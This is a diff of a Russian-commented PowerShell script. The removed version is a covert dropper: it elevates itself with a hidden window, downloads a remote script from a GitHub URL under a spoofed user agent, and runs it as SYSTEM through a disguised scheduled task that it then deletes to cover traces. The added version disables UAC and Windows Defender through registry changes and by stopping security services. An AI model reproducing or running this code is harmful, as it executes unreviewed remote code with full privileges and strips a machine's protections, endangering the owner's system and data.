@@ -1,54 +1,42 @@
-# --- СКРЫТОЕ ВЫПОЛНЕНИЕ ЧЕРЕЗ ПЛАНИРОВЩИК ---
-
-# 1. Подавляем ошибки
-$ErrorActionPreference = "SilentlyContinue"
-
-# 2. Проверка админки (и тишина)
-$Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
-$Principal = New-Object Security.Principal.WindowsPrincipal($Identity)
-$AdminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
-
-if (-not ($Principal.IsInRole($AdminRole))) {
-    # Запуск от админа
-    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-    exit
+# Запуск от имени администратора проверяется автоматически
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Warning "Необходимо запустить скрипт от имени администратора."
+    Exit
 }
 
-# 3. Настройки
-$Url = "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheak.ps1"
-# Прячем в Temp под системным именем
-$ScriptPath = "$env:TEMP\sys_update.ps1" 
-
-# 4. Скачиваем (маскируемся под WebClient)
+Write-Host "Отключение UAC..." -ForegroundColor Yellow
 try {
-    $WebClient = New-Object System.Net.WebClient
-    $WebClient.Headers.Add("User-Agent", "Microsoft-CryptoAPI")
-    $Payload = $WebClient.DownloadString($Url)
-    
-    # Сохраняем на диск
-    Set-Content -Path $ScriptPath -Value $Payload -Force
+    # Значение 0 отключает UAC. Без перезагрузки изменения могут не полностью вступить в силу.
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Type DWord
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord
+    Write-Host "UAC отключен. Для полного применения изменений обычно требуется перезагрузка." -ForegroundColor Green
 } catch {
-    exit
+    Write-Error "Ошибка при отключении UAC: $_"
 }
 
-# 5. Создаем задачу в Планировщике для СКРЫТОГО запуска
-# Это запустит скрипт от имени SYSTEM, без окон и пинги пойдут от системного процесса
-$TaskName = "WindowsSystemUpdateTask"
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
-$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) # Запустить сразу
-$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Write-Host "`nОтключение Windows Defender..." -ForegroundColor Yellow
+try {
+    # Отключение через реестр (DisableAntiSpyware)
+    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    if (-not (Test-Path $regPath)) {
+        New-Item -Path $regPath -Force | Out-Null
+    }
+    Set-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -Value 1 -Type DWord
+    Write-Host "Windows Defender отключен (через реестр)." -ForegroundColor Green
 
-# Регистрируем задачу (или обновляем, если есть)
-Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
+    # Попытка остановки и отключения служб Defender (чтобы сработало без перезагрузки)
+    Write-Host "Остановка служб Defender..." -ForegroundColor Gray
+    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
+    Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
+    
+    # На современных версиях Windows 10/11 также используются эти службы
+    Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
+    Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue
+    
+    Write-Host "Службы остановлены и отключены." -ForegroundColor Green
 
-# Запускаем задачу
-Start-ScheduledTask -TaskName $TaskName
+} catch {
+    Write-Error "Ошибка при отключении Defender: $_"
+}
 
-# Ждем секунду, чтобы задача стартовала, и удаляем саму задачу (чтобы не висела мусором)
-Start-Sleep -s 2
-Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
-
-# Удаляем скачанный скрипт после запуска (следы)
-# Remove-Item $ScriptPath -Force -ErrorAction SilentlyContinue 
-
-exit
+Write-Host "`nГотово." -ForegroundColor Cyan
